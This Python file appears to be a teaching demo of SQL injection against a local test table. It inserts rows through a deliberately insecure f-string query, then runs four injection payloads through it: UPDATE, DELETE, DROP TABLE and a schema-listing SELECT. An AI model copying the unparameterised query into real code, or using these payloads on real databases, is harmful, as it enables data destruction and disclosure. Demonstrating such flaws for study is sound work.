import os, sys
sys.path.append(os.path.join(
    os.path.dirname(os.path.dirname(__file__))
))
from Manager.db import database_manager

class main:
    
    def __init__(self):
        self.conexion = None

    def api_configuration(self):
        print(f"\n{'='*5} API Configuration")
        self.conexion = database_manager()
        self.conexion.conectar_bd('db_security')
        students = self.conexion.ejecutar_query("SELECT * FROM students;")
        print(f"Los students son: {students}")

    def create_table_for_testing(self):
        print(f"\n{'='*5} Create table for Testing")
        query = """CREATE TABLE test_sql_injections (
            id serial PRIMARY KEY,
            numero INTEGER,
            data VARCHAR(10)
        );
        """
        self.conexion.ejecutar_query(query)
        self.conexion.listar_tablas()
        self.conexion.mostrar_datos_tabla('test_sql_injections')

    def insertar_datos(self,numero,data):
        query = f"INSERT INTO test_sql_injections (numero,data) VALUES({numero},'{data}');"
        sql = self.conexion.ejecutar_query(query)
        print(f'Se ingreso "{numero}" como número y "{data}" como data')
        if bool(sql): return sql

    def injection(self):
        print(f"\n{'='*5} Add Rows (INSECURE WAY)")
        self.insertar_datos(100,'ABCDE')
        self.insertar_datos(200,'FGHIJ')
        self.insertar_datos(300,'KLMNO')
        self.conexion.mostrar_datos_tabla('test_sql_injections')

    def first_sql_injection(self):
        print(f"\n{'='*5} First SQL Injection")
        self.insertar_datos(999,"'); UPDATE test_sql_injections SET numero = 000 WHERE id < 4; --")
        self.conexion.mostrar_datos_tabla('test_sql_injections')

    def second_sql_injection(self):
        print(f"\n{'='*5} Second SQL Injection")
        self.insertar_datos(999,"'); DELETE FROM test_sql_injections WHERE id < 4; --")
        self.conexion.mostrar_datos_tabla('test_sql_injections')

    def third_sql_injection(self):
        print(f"\n{'='*5} Third SQL Injection")
        self.insertar_datos(999,"'); DROP TABLE test_sql_injections; --")
        self.conexion.mostrar_datos_tabla('test_sql_injections')

    def fourth_sql_injection(self):
        print(f"\n{'='*5} Fourth SQL Injection")
        malicious_query = "'); SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --"
        data = self.insertar_datos(999,malicious_query)
        print(f"La data recibida del query con SQL injection fue: {data}")
        
    def revertir_main(self):
        print(f"\n{'='*5}Revirtiendo main")
        self.conexion.eliminar_tabla('test_sql_injections')

    def main(self):

        self.api_configuration()

        self.create_table_for_testing()

        self.injection()

        self.first_sql_injection()

        self.second_sql_injection()

        self.third_sql_injection()

        self.fourth_sql_injection()

        self.revertir_main()
        self.conexion.cerrar_sesion()
